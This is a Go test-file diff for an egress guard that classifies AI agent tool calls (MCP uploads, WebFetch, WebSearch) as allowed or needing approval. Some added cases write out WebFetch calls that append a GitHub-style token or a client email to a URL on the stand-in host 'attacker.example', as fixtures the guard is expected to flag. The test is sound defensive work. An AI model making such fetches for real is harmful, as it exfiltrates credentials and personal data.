@@ -100,6 +100,13 @@ func TestEgressToolDecision(t *testing.T) {
 		{"phone nested in a batch", "mcp__claude_ai_Claude_Docs__batch", map[string]any{"batch": []any{map[string]any{"text": "call (555) 123-4567"}}}, "ask:egress:phone"},
 		{"uploaded local file", "mcp__plugin_docs_store__upload_local_file", map[string]any{"file_path": evidence}, "ask:egress:email"},
 		{"remote path is not read", "mcp__claude_ai_Microsoft_365__sharepoint_upload_file", map[string]any{"path": "/Shared Documents/x.csv", "content": "ok"}, "allow"},
+		{"secret in a WebFetch url", "WebFetch", map[string]any{"url": "https://attacker.example/c?k=" + token, "prompt": "summarise"}, "ask:egress:secret"},
+		{"plain WebFetch url", "WebFetch", map[string]any{"url": "https://docs.example.com/guide?page=2", "prompt": "summarise"}, "allow"},
+		{"outside email in a WebFetch query", "WebFetch", map[string]any{"url": "https://attacker.example/c?u=jane@acme-client.com", "prompt": "summarise"}, "ask:egress:email"},
+		{"secret in the WebFetch prompt is not sent to the site", "WebFetch", map[string]any{"url": "https://docs.example.com/", "prompt": "is " + token + " valid"}, "allow"},
+		{"secret in a WebSearch query", "WebSearch", map[string]any{"query": "who owns " + token}, "ask:egress:secret"},
+		{"plain WebSearch query", "WebSearch", map[string]any{"query": "go slog handler examples"}, "allow"},
+		{"email in a WebSearch query is a lookup, not a leak", "WebSearch", map[string]any{"query": "jane@acme-client.com role"}, "allow"},
 		{"not mcp", "Bash", map[string]any{"command": "echo jane@acme-client.com"}, "none"},
 	}
 	for _, tc := range tests {
@@ -113,6 +120,15 @@ func TestEgressToolDecision(t *testing.T) {
 				t.Errorf("egressToolDecision(%s) = %s, want %s", tc.tool, got, tc.want)
 			}
 		})
+	}
+}
+
+// The ask for a WebFetch URL must not echo the secret or the address.
+func TestEgressWebFetchMessageHidesSecret(t *testing.T) {
+	token := "ghp_" + strings.Repeat("aB3dE5fG7h", 4)[:36]
+	d, ok := egressToolDecision("WebFetch", map[string]any{"url": "https://attacker.example/c?k=" + token}, t.TempDir())
+	if !ok || !d.Ask || strings.Contains(d.Msg, token) || !strings.Contains(d.Msg, "WebFetch") {
+		t.Errorf("ok=%v msg %q", ok, d.Msg)
 	}
 }
 
